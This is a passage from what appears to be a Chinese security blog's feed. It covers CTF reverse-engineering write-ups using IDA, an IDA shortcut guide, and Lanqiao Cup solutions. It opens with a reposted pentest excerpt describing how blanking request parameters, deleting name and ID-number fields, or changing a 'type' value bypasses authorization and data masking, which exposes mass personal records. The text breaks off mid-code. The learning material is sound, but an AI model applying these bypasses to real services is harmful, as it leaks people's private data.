src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205092031216.png" alt="image-20241205092031216"></p><p>strKey对应身份密钥，strLcode对应重要数据，是从9003端口注入里查出来的，填入的strLcode必须要在数据库里，不然查不出数据，大写M开头加上9个数字。</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205092047213.png" alt="image-20241205092047213"></p><h1 id="置空艺术之越权"><a href="#置空艺术之越权" class="headerlink" title="置空艺术之越权"></a>置空艺术之越权</h1><p>注册后，某接口id原来是一大串无规则字符串，置空，能查到什么，懂得都懂</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205092106222.png" alt="image-20241205092106222"></p><h1 id="置空艺术之导出"><a href="#置空艺术之导出" class="headerlink" title="置空艺术之导出"></a>置空艺术之导出</h1><p>和越权类似，也是普通用户登录后，有个导出功能不过有导出限制，把其他参数都删了，就留个startTime和endTime，能导出全站人数据整整20M，还发现存在未授权访问。</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205092120256.png" alt="image-20241205092120256"></p><h1 id="置空艺术之无中生有1"><a href="#置空艺术之无中生有1" class="headerlink" title="置空艺术之无中生有1"></a>置空艺术之无中生有1</h1><p>某处功能为根据一串加密编码查询敏感信息</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205092139266.png" alt="image-20241205092139266"></p><p>不过需要姓名和身份证才能查出加密编码</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205092148490.png" alt="image-20241205092148490"></p><p>直接抓包把姓名(empname)、身份证(identityno)整个字段去了</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205092211430.png" alt="image-20241205092211430"></p><h1 id="置空艺术之无中生有2"><a href="#置空艺术之无中生有2" class="headerlink" title="置空艺术之无中生有2"></a>置空艺术之无中生有2</h1><p>和上面一样，查东西需要姓名、身份证</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205092231457.png" alt="image-20241205092231457"></p><p>抓包，该删删</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205092238382.png" alt="image-20241205092238382"></p><p>找到个姓名、证书编号就能查信息的地方，不过身份证脱敏了</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205092248785.png" alt="image-20241205092248785"></p><p>抓包，type原来是1，改为2可以绕过脱敏</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205092257227.png" alt="image-20241205092257227"></p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>reverse中的RC4，TEA和base 64</title>
    <link href="/2024/11/21/reverse%E4%B8%AD%E7%9A%84RC4%EF%BC%8CTEA%E5%92%8Cbase-64/"/>
    <url>/2024/11/21/reverse%E4%B8%AD%E7%9A%84RC4%EF%BC%8CTEA%E5%92%8Cbase-64/</url>
    
    <content type="html"><![CDATA[<p>还没写</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA(3)</title>
    <link href="/2024/11/19/IDA-3/"/>
    <url>/2024/11/19/IDA-3/</url>
    
    <content type="html"><![CDATA[<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">一般来说，逆向分析并不是对那些庞大的程序进行完整的逆向，只是分析特定位置的一个或几个函数。<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA(2)</title>
    <link href="/2024/11/17/IDA-2/"/>
    <url>/2024/11/17/IDA-2/</url>
    
    <content type="html"><![CDATA[<p>为了更好的学习掌握IDA的使用以及逆向的代码逻辑思维，我将使用buuctf的题目来进一步学习</p><h1 id="1、easyre"><a href="#1、easyre" class="headerlink" title="1、easyre"></a>1、easyre</h1><p>ida打开，flag煳脸上了</p><p><img src="/2024/11/17/IDA-2/image-20241117220520710.png" alt="image-20241117220520710"></p><h1 id="2、reverse1"><a href="#2、reverse1" class="headerlink" title="2、reverse1"></a>2、reverse1</h1><p>拖进来，默认没壳，几板斧下去，重命名一下已知函数</p><p>输入flag，判断，str1大于str2才会为真，但是有个！，所以说我们要为0，也就是str1和str2需要相等</p><p>ok，查看v3，也就是上面的str2</p><p><img src="/2024/11/17/IDA-2/image-20241117221916406.png" alt="image-20241117221916406"></p><p>可以看到有个{hello_world}，尝试一下，发现是错的，继续分析</p><p><img src="/2024/11/17/IDA-2/image-20241117223059366.png" alt="image-20241117223059366"></p><p><img src="/2024/11/17/IDA-2/image-20241117223330281.png" alt="image-20241117223330281"></p><p>不用具体分析，就可以看出，将o替换成0（发现疑似ascii可以按R键转义为字符），再次尝试，成功</p><p><img src="/2024/11/17/IDA-2/image-20241117223345116.png" alt="image-20241117223345116"></p><p><img src="/2024/11/17/IDA-2/image-20241117223428125.png" alt="image-20241117223428125"></p><h1 id="3、reverse2"><a href="#3、reverse2" class="headerlink" title="3、reverse2"></a>3、reverse2</h1><p>查看，flag，然后查看伪代码，套路还是一样的，我们往上查看代码</p><p><img src="/2024/11/17/IDA-2/image-20241117225132619.png" alt="image-20241117225132619"></p><p><img src="/2024/11/17/IDA-2/image-20241117225153542.png" alt="image-20241117225153542"></p><p>r键将其转换成ascii码，一眼看出来，和前面一体大差不差，遍历到i或者r，就将其换成1，所以最终flag为</p><p>flag{hack1ng_fo1_fun}</p><p><img src="/2024/11/17/IDA-2/image-20241117225213444.png" alt="image-20241117225213444"></p><h1 id="4、内涵的软件"><a href="#4、内涵的软件" class="headerlink" title="4、内涵的软件"></a>4、内涵的软件</h1><p>flag也是糊脸上了</p><p><img src="/2024/11/17/IDA-2/image-20241117225829377.png" alt="image-20241117225829377"></p><h1 id="5、新年快乐"><a href="#5、新年快乐" class="headerlink" title="5、新年快乐"></a>5、新年快乐</h1><p>有upx壳，使用工具一键脱就行了</p><p><img src="/2024/11/17/IDA-2/73b51ca1b40843ae253f90e59ede60f.png" alt="73b51ca1b40843ae253f90e59ede60f"></p><p><img src="/2024/11/17/IDA-2/image-20241117230505661.png" alt="image-20241117230505661"></p><p><img src="/2024/11/17/IDA-2/image-20241117230514964.png" alt="image-20241117230514964"></p><p>可以正常查看</p><p><img src="/2024/11/17/IDA-2/image-20241117230736168.png" alt="image-20241117230736168"></p><p>通过代码，可以产看“HappyNewYear!” 赋到str2,然后str1是自己输入的内容，也就是说str1需要等于str2，返回0，才会进入ture中，直接将“HappyNewYear!”输入即可</p><p><img src="/2024/11/17/IDA-2/image-20241117231247318.png" alt="image-20241117231247318"></p><p><img src="/2024/11/17/IDA-2/image-20241117231639561.png" alt="image-20241117231639561"></p><h1 id="6、XOR"><a href="#6、XOR" class="headerlink" title="6、XOR"></a>6、XOR</h1><p>根据标题，双击global，然后光标选择到指定区域，再次双击，然后shift+e查看提取的数据，这里选择ascii码，方便提取</p><p>配合chatgpt写出解密脚本</p><p><img src="/2024/11/17/IDA-2/image-20241118130252359.png" alt="image-20241118130252359"></p><p><img src="/2024/11/17/IDA-2/image-20241118130549252.png" alt="image-20241118130549252"></p><p><img src="/2024/11/17/IDA-2/image-20241118131934521.png" alt="image-20241118131934521"></p><p><img src="/2024/11/17/IDA-2/image-20241118131951543.png" alt="image-20241118131951543"></p><h1 id="7、reverse-3"><a href="#7、reverse-3" class="headerlink" title="7、reverse 3"></a>7、reverse 3</h1><p>base64</p><p><img src="/2024/11/17/IDA-2/image-20241118230014059.png" alt="image-20241118230014059"></p><p>还是和前面差不多，查看加密函数，丢到gpt分析</p><p><img src="/2024/11/17/IDA-2/image-20241118222414261.png" alt="image-20241118222414261"></p><p><img src="/2024/11/17/IDA-2/image-20241118222712121.png" alt="image-20241118222712121"></p><p>使用python解密，主函数中，加上自己本身的索引，达成加密效果，我们直接减就行了</p><p><img src="/2024/11/17/IDA-2/image-20241119124003676.png" alt="image-20241119124003676"></p><p>根据前面的伪代码提示，写出解密代码</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>a = <span class="hljs-string">&quot;e3nifIH9b_C@n@dH&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a[i]) - i) <span class="hljs-comment"># 减去自己索引 </span><br><br><span class="hljs-built_in">print</span>(base64.b64decode(flag))<br><br><span class="hljs-string">b&#x27;&#123;i_l0ve_you&#125;&#x27;</span><br></code></pre></div></td></tr></table></figure><h1 id="8、不一样的flag"><a href="#8、不一样的flag" class="headerlink" title="8、不一样的flag"></a>8、不一样的flag</h1><p>题目的再次练习</p><p>看到敏感字符，然后跟踪看看，哪个函数调用，main调用，查看伪代码</p><p><img src="/2024/11/17/IDA-2/image-20241120224712705.png" alt="image-20241120224712705"></p><p><img src="/2024/11/17/IDA-2/image-20241120224725759.png" alt="image-20241120224725759"></p><p>控制方向，那上面的01就是地图了，*#一个起点一个终点。</p><p><img src="/2024/11/17/IDA-2/image-20241120224755385.png" alt="image-20241120224755385"></p><p>5*5迷宫</p><p><img src="/2024/11/17/IDA-2/image-20241120225124499.png" alt="image-20241120225124499"></p><figure class="highlight hsp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs hsp"><span class="hljs-symbol">*1111</span><br><span class="hljs-number">01000</span><br><span class="hljs-number">01010</span><br><span class="hljs-number">00010</span><br><span class="hljs-number">1111</span><span class="hljs-meta">#</span><br><br>flag&#123;<span class="hljs-number">222441144222</span>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2024/11/17/IDA-2/image-20241120225303806.png" alt="image-20241120225303806"></p><p>​</p><p>通过这些题目的练习以及IDA的操作，对于IDA的基础操作基本了解了</p>]]></content>
    
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA(1)</title>
    <link href="/2024/11/17/IDA-1/"/>
    <url>/2024/11/17/IDA-1/</url>
    
    <content type="html"><![CDATA[<h1 id="1、安装略过"><a href="#1、安装略过" class="headerlink" title="1、安装略过"></a>1、安装略过</h1><h1 id="2、熟悉"><a href="#2、熟悉" class="headerlink" title="2、熟悉"></a>2、熟悉</h1><h2 id="1、界面"><a href="#1、界面" class="headerlink" title="1、界面"></a>1、界面</h2><p><img src="/2024/11/17/IDA-1/image-20241117205908315.png" alt="image-20241117205908315"></p><p>两重要窗口</p><p>​左函数窗口</p><p>​右图形模式汇编和文本模式（空格切换）</p><h2 id="2、字符串串口"><a href="#2、字符串串口" class="headerlink" title="2、字符串串口"></a>2、字符串串口</h2><p>快捷键shift+F12进入字符串窗口，双击字符串可以进入对应数据区域</p><p><img src="/2024/11/17/IDA-1/image-20241117210141425.png" alt="image-20241117210141425"></p><h2 id="3、ida数据窗口"><a href="#3、ida数据窗口" class="headerlink" title="3、ida数据窗口"></a>3、ida数据窗口</h2><p>可以更改指令，F2进入编辑模式，退出再按一次</p><p>G键跳转到指定地址</p><p><img src="/2024/11/17/IDA-1/image-20241117210344979.png" alt="image-20241117210344979"></p><h2 id="4、交叉引用"><a href="#4、交叉引用" class="headerlink" title="4、交叉引用"></a>4、交叉引用</h2><p>对于一些函数，ida会在地址加入sub_的方式作为函数名，如果想知道查看这个函数在哪里被引用，可以使用快捷键X</p><p>可以看到，这个函数被引用的地方有4个，</p><p><img src="/2024/11/17/IDA-1/image-20241117210808301.png" alt="image-20241117210808301"></p><p>这个表格有4个子项：</p><ul><li>direction ，表示被引用的地方是在当前地址的前面还是后面</li><li>Type，这个有点复杂，交叉引用分为代码交叉引用和数据交叉引用</li><li><ul><li>读取交叉引用， 用 r 表示</li><li>写入交叉引用，用 w 表示</li><li>偏移量交叉引用，用 o 表示</li><li>普通流，用 o 表示</li><li>调用流，用 p 表示</li><li>跳转流，用 j 表示</li><li>代码交叉引用又分为</li><li>数据交叉引用</li></ul></li><li>Address，引用地址</li><li>Text，引用地址处的反汇编文本</li></ul><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>这个error，双击，然后找到字符串位置</p><p><img src="/2024/11/17/IDA-1/image-20241117212259468.png" alt="image-20241117212259468"></p><p>然后X，跳转到位置，成功跳转，也就是main函数了</p><p><img src="/2024/11/17/IDA-1/image-20241117212334224.png" alt="image-20241117212334224"></p><p><img src="/2024/11/17/IDA-1/image-20241117212407906.png" alt="image-20241117212407906"></p><p>N键选择对应函数可以重命名</p><p><img src="/2024/11/17/IDA-1/image-20241117213546783.png" alt="image-20241117213546783"></p><h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><p><strong>a</strong>：将数据转换为字符串</p><p><strong>f5&#x2F;tab</strong>：一键反汇编</p><p><strong>esc</strong>：回退键，能够倒回上一部操作的视图（只有在反汇编窗口才是这个作用，如果是在其他窗口按下esc，会关闭该窗口）</p><p><strong>shift+f12</strong>：可以打开string窗口，一键找出所有的字符串，右击setup，还能对窗口的属性进行设置</p><p><strong>ctrl+w</strong>：保存ida数据库</p><p><strong>ctrl+鼠标滚轮</strong>：能够调节流程视图的大小</p><p><strong>x</strong>：对着某个函数、变量按该快捷键，可以查看它的交叉引用</p><p><strong>g</strong>：直接跳转到某个地址</p><p><strong>n</strong>：更改变量的名称</p><p><strong>y</strong>：更改变量的类型</p><p><strong>&#x2F;</strong> ：在反编译后伪代码的界面中写下注释</p><p>****：在反编译后伪代码的界面中隐藏&#x2F;显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多</p><p><strong>；</strong> ：在反汇编后的界面中写下注释</p><p><strong>ctrl+shift+w</strong>：拍摄IDA快照</p><p><strong>u</strong>：undefine，取消定义函数、代码、数据的定义</p>]]></content>
    
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024蓝桥杯网络安全赛道题目复现</title>
    <link href="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-安全知识"><a href="#1-安全知识" class="headerlink" title="1.安全知识"></a>1.安全知识</h1><figure class="highlight tex"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tex">1.在PHP中，以下选项中哪一个运算符含义为x绝对等于y。C<br>A. x = y<br>B. x == y<br>C. x === y<br>D. x !== y<br><br>2.在PHP中，以下选项中哪一个运算符含义为x绝对等于y： 这题什么鬼，不懂<br>A. 无限制<br>B. 有规则的文件名<br>C. 白名单<br>D. 黑名单<br><br>3.读取外部传入XML文件时，XML解析器初始化过程中应该设置（）A<br>A. 关闭DTD解析<br>B. 关闭XML解析<br>C. 打开DTD解析<br>D. 关键字过滤<br><br>4.代码安全审计规范中规定审计过程包括四个阶段：审计准备、审计实施、审计报告、（）。A<br>A. 改进跟踪<br>B. 前瞻审计<br>C. 形成报告<br>D. 档案归档<br><br>5.代码安全审计准备阶段，应该了解项目的应用场景、目标客户、开发内容、（）。B<br>A. 代码<br>B. 开发者遵循的标准和流程<br>C. 开发者编写的测试代码<br>D. 开发者所用的开发工具<br><br>6.对于可重放的敏感操作请求，需部署（）防御机制B<br>A. SSRF<br>B. CSRF<br>C. SSTI<br>D. RCE<br><br>7.开发人员编写前端代码时，应该避免使用（），转为使用（），以此避免注入攻击。 抽象题目C<br>A. eval、function<br>B. escape、encodeURIComponent<br>C. eval、JSON.parse<br>D. eval、console.log<br><br>8.在web开发过程中，与用户相关的重要操作建议采用下列哪项措施。C<br>A. 密码要小于6位方便记忆<br>B. 验证码使用后不要失效<br>C. 接收短信验证码<br>D. 同一密码多次使用<br><br>9.以下远程运维中，不存在风险行为的是 （）。B<br>A. 将可能存在安全风险的终端接入内部网络进行运维<br>B. 使用TLS协议加密传输通道<br>C. 仅记录运维操作日志中的操作人及操作时间<br>D. 使用DES算法加密敏感数据<br><br>10.针对防止敏感文件泄漏以下做法错误的是 （）。B<br>A. 删除网站.git相关文件<br>B. 应用系统操作手册外传gitee<br>C. 禁止将系统开发源码上传github<br>D. 删除网站.svn文件<br></code></pre></div></td></tr></table></figure><h1 id="2-情报收集"><a href="#2-情报收集" class="headerlink" title="2.情报收集"></a>2.情报收集</h1><h2 id="1-爬虫协议"><a href="#1-爬虫协议" class="headerlink" title="1.爬虫协议"></a>1.爬虫协议</h2><p>小蓝同学在开发网站时了解到了一个爬虫协议，该协议指网站可建立一个特别的txt文件来告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，而搜索引擎则通过读取该txt文件来识别这个页面是否允许被抓取。爬虫协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</p><p>robots.txt</p><h1 id="3-数据分析"><a href="#3-数据分析" class="headerlink" title="3.数据分析"></a>3.数据分析</h1><h2 id="1-packet"><a href="#1-packet" class="headerlink" title="1.packet"></a>1.packet</h2><p>wireshark在手，简单的数据包分析就是小case。</p><p>直接字符串搜索flag，然后查看tcp流就行了，然后base64解码</p><p><img src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241116212604334.png" alt="image-20241116212604334"></p><p><img src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241116212708311.png" alt="image-20241116212708311"></p><p><img src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241116212735120.png" alt="image-20241116212735120"></p><h2 id="2-缺失的数据"><a href="#2-缺失的数据" class="headerlink" title="2.缺失的数据"></a>2.缺失的数据</h2><p>题目内容：随着数字技术的迅猛发展，图像在网络上的传播日益广泛。然而，这也带来了版权保护、信息认证和内容完整性验证等一系列问题。数字水印技术作为一种有效的信息隐藏和认证手段，请分析出图片中隐藏的信息。</p><p>里面分别有几个文件，文件中字典，直接字典爆破出密码，查看图片，再看python代码，有个加水印，和解水印代码，丢ai，让ai改了之后，更改路径，运行</p><p><img src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241116213751084.png" alt="image-20241116213751084"></p><p><img src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241116215024319.png" alt="image-20241116215024319"></p><p><img src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241116215955519.png" alt="image-20241116215955519"></p><p>xs参数调节图片，默认数字很糊</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> pywt<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WaterMarkDWT</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, origin: <span class="hljs-built_in">str</span>, watermark: <span class="hljs-built_in">str</span>, key: <span class="hljs-built_in">int</span>, weight: <span class="hljs-built_in">list</span></span>):<br>        <span class="hljs-comment"># 使用绝对路径</span><br>        origin = os.path.abspath(origin)<br>        watermark = os.path.abspath(watermark)<br><br>        <span class="hljs-variable language_">self</span>.key = key<br>        <span class="hljs-variable language_">self</span>.img = cv2.imread(origin)<br>        <span class="hljs-variable language_">self</span>.mark = cv2.imread(watermark)<br>        <span class="hljs-variable language_">self</span>.coef = weight<br><br>        <span class="hljs-comment"># 检查图片是否加载成功</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.img <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">raise</span> FileNotFoundError(<span class="hljs-string">f&quot;Cannot load image: <span class="hljs-subst">&#123;origin&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.mark <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">raise</span> FileNotFoundError(<span class="hljs-string">f&quot;Cannot load image: <span class="hljs-subst">&#123;watermark&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">arnold</span>(<span class="hljs-params">self, img</span>):<br>        r, c = img.shape<br>        p = np.zeros((r, c), np.uint8)<br>        a, b = <span class="hljs-number">1</span>, <span class="hljs-number">1</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.key,<span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r):<br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>                    x = (i + b * j) % r<br>                    y = (a * i + (a * b + <span class="hljs-number">1</span>) * j) % c<br>                    p[x, y] = img[i, j]<br>        <span class="hljs-keyword">return</span> p<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">deArnold</span>(<span class="hljs-params">self, img</span>):<br>        r, c = img.shape<br>        p = np.zeros((r, c), np.uint8)<br>        a, b = <span class="hljs-number">1</span>, <span class="hljs-number">1</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.key):<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r):<br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>                    x = ((a * b + <span class="hljs-number">1</span>) * i - b * j) % r<br>                    y = (-a * i + j) % c<br>                    p[x, y] = img[i, j]<br>        <span class="hljs-keyword">return</span> p<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, size: <span class="hljs-built_in">tuple</span> = (<span class="hljs-params"><span class="hljs-number">1200</span>, <span class="hljs-number">1200</span></span>), flag: <span class="hljs-built_in">int</span> = <span class="hljs-literal">None</span></span>):<br>        img = cv2.resize(<span class="hljs-variable language_">self</span>.img, size)<br>        img1 = cv2.cvtColor(img, cv2.COLOR_RGB2GRAY)<br>        img2 = cv2.cvtColor(<span class="hljs-variable language_">self</span>.mark, cv2.COLOR_RGB2GRAY)<br><br>        c = pywt.wavedec2(img2, 